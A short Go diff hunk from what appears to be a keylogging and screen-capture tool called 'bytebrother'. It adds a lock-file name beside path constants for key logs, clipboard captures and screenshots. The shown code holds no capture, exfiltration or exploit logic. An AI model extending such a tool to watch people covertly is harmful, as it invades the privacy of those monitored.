@@ -18,6 +18,7 @@ var KeyLogs string = "key_logs.log"
 var ClipboardFolder string = Folder + "clipboard/"
 var ClipboardFile string = "clipboard.json"
 var ScreenshotFolder string = Folder + "screenshots/"
+var LockFile string = "bytebrother.lock"
 
 func WalkDir(root string, walkFn func(path string, info os.FileInfo, err error) error) error {
 	return filepath.Walk(root, walkFn)
